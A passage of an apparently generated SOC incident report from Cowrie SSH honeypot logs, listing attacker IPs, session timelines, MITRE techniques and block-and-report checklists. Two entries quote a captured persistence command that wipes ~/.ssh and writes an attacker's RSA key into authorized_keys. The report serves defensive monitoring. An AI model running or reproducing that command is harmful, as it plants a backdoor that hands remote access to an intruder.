- [ ] Block `136.248.242[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13677119e1ff

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:04 |
| **Last Seen** | 2026-09-03 12:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:04:48` | `cowrie.session.connect` |
| `2026-09-03 12:04:48` | `cowrie.client.version` |
| `2026-09-03 12:04:48` | `cowrie.client.kex` |
| `2026-09-03 12:04:48` | `cowrie.login.success` |
| `2026-09-03 12:04:49` | `cowrie.session.params` |
| `2026-09-03 12:04:49` | `cowrie.command.input` |
| `2026-09-03 12:04:49` | `cowrie.log.closed` |
| `2026-09-03 12:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ff2286b3d0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:06 |
| **Last Seen** | 2026-09-03 12:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:06:23` | `cowrie.session.connect` |
| `2026-09-03 12:06:23` | `cowrie.client.version` |
| `2026-09-03 12:06:23` | `cowrie.client.kex` |
| `2026-09-03 12:06:23` | `cowrie.login.success` |
| `2026-09-03 12:06:24` | `cowrie.session.params` |
| `2026-09-03 12:06:24` | `cowrie.command.input` |
| `2026-09-03 12:06:24` | `cowrie.log.closed` |
| `2026-09-03 12:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1816c1f2c02

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-09-03 12:06 |
| **Last Seen** | 2026-09-03 12:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:06:58` | `cowrie.session.connect` |
| `2026-09-03 12:06:58` | `cowrie.client.version` |
| `2026-09-03 12:06:58` | `cowrie.client.kex` |
| `2026-09-03 12:06:59` | `cowrie.login.success` |
| `2026-09-03 12:06:59` | `cowrie.session.params` |
| `2026-09-03 12:06:59` | `cowrie.command.input` |
| `2026-09-03 12:06:59` | `cowrie.command.failed` |
| `2026-09-03 12:06:59` | `cowrie.log.closed` |
| `2026-09-03 12:07:00` | `cowrie.session.params` |
| `2026-09-03 12:07:00` | `cowrie.command.input` |
| `2026-09-03 12:07:00` | `cowrie.session.file_download` |
| `2026-09-03 12:07:00` | `cowrie.log.closed` |
| `2026-09-03 12:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eceb60f21801

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-09-03 12:07 |
| **Last Seen** | 2026-09-03 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:07:00` | `cowrie.session.connect` |
| `2026-09-03 12:07:00` | `cowrie.client.version` |
| `2026-09-03 12:07:00` | `cowrie.client.kex` |
| `2026-09-03 12:07:01` | `cowrie.login.success` |
| `2026-09-03 12:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f99255e10401

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-09-03 12:07 |
| **Last Seen** | 2026-09-03 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:07:01` | `cowrie.session.connect` |
| `2026-09-03 12:07:01` | `cowrie.client.version` |
| `2026-09-03 12:07:01` | `cowrie.client.kex` |
| `2026-09-03 12:07:01` | `cowrie.login.success` |
| `2026-09-03 12:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcb9e30162eb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:08 |
| **Last Seen** | 2026-09-03 12:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:08:01` | `cowrie.session.connect` |
| `2026-09-03 12:08:01` | `cowrie.client.version` |
| `2026-09-03 12:08:01` | `cowrie.client.kex` |
| `2026-09-03 12:08:02` | `cowrie.login.success` |
| `2026-09-03 12:08:02` | `cowrie.session.params` |
| `2026-09-03 12:08:02` | `cowrie.command.input` |
| `2026-09-03 12:08:03` | `cowrie.log.closed` |
| `2026-09-03 12:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f9639485ff4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:09 |
| **Last Seen** | 2026-09-03 12:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:09:40` | `cowrie.session.connect` |
| `2026-09-03 12:09:40` | `cowrie.client.version` |
| `2026-09-03 12:09:40` | `cowrie.client.kex` |
| `2026-09-03 12:09:41` | `cowrie.login.success` |
| `2026-09-03 12:09:42` | `cowrie.session.params` |
| `2026-09-03 12:09:42` | `cowrie.command.input` |
| `2026-09-03 12:09:42` | `cowrie.log.closed` |
| `2026-09-03 12:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743a4ffd89ad

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:10 |
| **Last Seen** | 2026-09-03 12:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:10:22` | `cowrie.session.connect` |
| `2026-09-03 12:10:22` | `cowrie.client.version` |
| `2026-09-03 12:10:22` | `cowrie.client.kex` |
| `2026-09-03 12:10:23` | `cowrie.login.success` |
| `2026-09-03 12:10:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:10:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:10:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:10:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bf27b8b261

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:11 |
| **Last Seen** | 2026-09-03 12:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:11:20` | `cowrie.session.connect` |
| `2026-09-03 12:11:20` | `cowrie.client.version` |
| `2026-09-03 12:11:20` | `cowrie.client.kex` |
| `2026-09-03 12:11:20` | `cowrie.login.success` |
| `2026-09-03 12:11:21` | `cowrie.session.params` |
| `2026-09-03 12:11:21` | `cowrie.command.input` |
| `2026-09-03 12:11:21` | `cowrie.log.closed` |
| `2026-09-03 12:11:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1847521eb68a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:13 |
| **Last Seen** | 2026-09-03 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:13:03` | `cowrie.session.connect` |
| `2026-09-03 12:13:03` | `cowrie.client.version` |
| `2026-09-03 12:13:03` | `cowrie.client.kex` |
| `2026-09-03 12:13:03` | `cowrie.login.success` |
| `2026-09-03 12:13:04` | `cowrie.session.params` |
| `2026-09-03 12:13:04` | `cowrie.command.input` |
| `2026-09-03 12:13:04` | `cowrie.log.closed` |
| `2026-09-03 12:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d719babd84e8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:13 |
| **Last Seen** | 2026-09-03 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:13:07` | `cowrie.session.connect` |
| `2026-09-03 12:13:07` | `cowrie.client.version` |
| `2026-09-03 12:13:07` | `cowrie.client.kex` |
| `2026-09-03 12:13:08` | `cowrie.login.success` |
| `2026-09-03 12:13:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:13:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:13:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96747b14a408

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:14 |
| **Last Seen** | 2026-09-03 12:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:14:47` | `cowrie.session.connect` |
| `2026-09-03 12:14:47` | `cowrie.client.version` |
| `2026-09-03 12:14:47` | `cowrie.client.kex` |
| `2026-09-03 12:14:47` | `cowrie.login.success` |
| `2026-09-03 12:14:48` | `cowrie.session.params` |
| `2026-09-03 12:14:48` | `cowrie.command.input` |
| `2026-09-03 12:14:48` | `cowrie.log.closed` |
| `2026-09-03 12:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-495793b37511

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:16 |
| **Last Seen** | 2026-09-03 12:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:16:22` | `cowrie.session.connect` |
| `2026-09-03 12:16:22` | `cowrie.client.version` |
| `2026-09-03 12:16:22` | `cowrie.client.kex` |
| `2026-09-03 12:16:22` | `cowrie.login.success` |
| `2026-09-03 12:16:23` | `cowrie.session.params` |
| `2026-09-03 12:16:23` | `cowrie.command.input` |
| `2026-09-03 12:16:23` | `cowrie.log.closed` |
| `2026-09-03 12:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8a553333a28

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:17 |
| **Last Seen** | 2026-09-03 12:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:17:55` | `cowrie.session.connect` |
| `2026-09-03 12:17:55` | `cowrie.client.version` |
| `2026-09-03 12:17:55` | `cowrie.client.kex` |
| `2026-09-03 12:17:55` | `cowrie.login.success` |
| `2026-09-03 12:17:56` | `cowrie.session.params` |
| `2026-09-03 12:17:56` | `cowrie.command.input` |
| `2026-09-03 12:17:56` | `cowrie.log.closed` |
| `2026-09-03 12:17:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b18b2b8d2a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:19 |
| **Last Seen** | 2026-09-03 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:19:31` | `cowrie.session.connect` |
| `2026-09-03 12:19:31` | `cowrie.client.version` |
| `2026-09-03 12:19:31` | `cowrie.client.kex` |
| `2026-09-03 12:19:32` | `cowrie.login.success` |
| `2026-09-03 12:19:33` | `cowrie.session.params` |
| `2026-09-03 12:19:33` | `cowrie.command.input` |
| `2026-09-03 12:19:33` | `cowrie.log.closed` |
| `2026-09-03 12:19:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da31b2713dee

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:19 |
| **Last Seen** | 2026-09-03 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:19:50` | `cowrie.session.connect` |
| `2026-09-03 12:19:50` | `cowrie.client.version` |
| `2026-09-03 12:19:51` | `cowrie.client.kex` |
| `2026-09-03 12:19:51` | `cowrie.login.success` |
| `2026-09-03 12:19:52` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:19:52` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:19:52` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:19:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-775ddda04563

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:21 |
| **Last Seen** | 2026-09-03 12:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:21:12` | `cowrie.session.connect` |
| `2026-09-03 12:21:12` | `cowrie.client.version` |
| `2026-09-03 12:21:12` | `cowrie.client.kex` |
| `2026-09-03 12:21:12` | `cowrie.login.success` |
| `2026-09-03 12:21:13` | `cowrie.session.params` |
| `2026-09-03 12:21:13` | `cowrie.command.input` |
| `2026-09-03 12:21:13` | `cowrie.log.closed` |
| `2026-09-03 12:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d7e74e73a8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 12:22 |
| **Last Seen** | 2026-09-03 12:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:22:36` | `cowrie.session.connect` |
| `2026-09-03 12:22:36` | `cowrie.client.version` |
| `2026-09-03 12:22:36` | `cowrie.client.kex` |
| `2026-09-03 12:22:36` | `cowrie.login.success` |
| `2026-09-03 12:22:36` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:22:36` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30708dd840d8

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:22 |
| **Last Seen** | 2026-09-03 12:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:22:50` | `cowrie.session.connect` |
| `2026-09-03 12:22:50` | `cowrie.client.version` |
| `2026-09-03 12:22:50` | `cowrie.client.kex` |
| `2026-09-03 12:22:50` | `cowrie.login.success` |
| `2026-09-03 12:22:51` | `cowrie.session.params` |
| `2026-09-03 12:22:51` | `cowrie.command.input` |
| `2026-09-03 12:22:51` | `cowrie.log.closed` |
| `2026-09-03 12:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4883b820b29b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:23 |
| **Last Seen** | 2026-09-03 12:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:23:58` | `cowrie.session.connect` |
| `2026-09-03 12:23:58` | `cowrie.client.version` |
| `2026-09-03 12:23:58` | `cowrie.client.kex` |
| `2026-09-03 12:23:59` | `cowrie.login.success` |
| `2026-09-03 12:24:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:24:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:24:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7450dcf35c9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:24 |
| **Last Seen** | 2026-09-03 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:24:27` | `cowrie.session.connect` |
| `2026-09-03 12:24:27` | `cowrie.client.version` |
| `2026-09-03 12:24:27` | `cowrie.client.kex` |
| `2026-09-03 12:24:28` | `cowrie.login.success` |
| `2026-09-03 12:24:29` | `cowrie.session.params` |
| `2026-09-03 12:24:29` | `cowrie.command.input` |
| `2026-09-03 12:24:29` | `cowrie.log.closed` |
| `2026-09-03 12:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-944848d708b4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-09-03 12:26 |
| **Last Seen** | 2026-09-03 12:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:26:12` | `cowrie.session.connect` |
| `2026-09-03 12:26:12` | `cowrie.client.version` |
| `2026-09-03 12:26:12` | `cowrie.client.kex` |
| `2026-09-03 12:26:13` | `cowrie.login.success` |
| `2026-09-03 12:26:13` | `cowrie.session.params` |
| `2026-09-03 12:26:13` | `cowrie.command.input` |
| `2026-09-03 12:26:13` | `cowrie.log.closed` |
| `2026-09-03 12:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64237498a464

| Field | Detail |
|---|---|
| **Source IP** | `164.52.105[.]37` |
| **First Seen** | 2026-09-03 12:27 |
| **Last Seen** | 2026-09-03 12:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:27:44` | `cowrie.session.connect` |
| `2026-09-03 12:27:44` | `cowrie.client.version` |
| `2026-09-03 12:27:45` | `cowrie.client.kex` |
| `2026-09-03 12:27:46` | `cowrie.login.success` |
| `2026-09-03 12:27:47` | `cowrie.session.params` |
| `2026-09-03 12:27:47` | `cowrie.command.input` |
| `2026-09-03 12:27:47` | `cowrie.command.failed` |
| `2026-09-03 12:27:48` | `cowrie.log.closed` |
| `2026-09-03 12:27:48` | `cowrie.session.params` |
| `2026-09-03 12:27:48` | `cowrie.command.input` |
| `2026-09-03 12:27:49` | `cowrie.session.file_download` |
| `2026-09-03 12:27:49` | `cowrie.log.closed` |
| `2026-09-03 12:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.52.105[.]37` to AbuseIPDB if not already reported
- [ ] Block `164.52.105[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
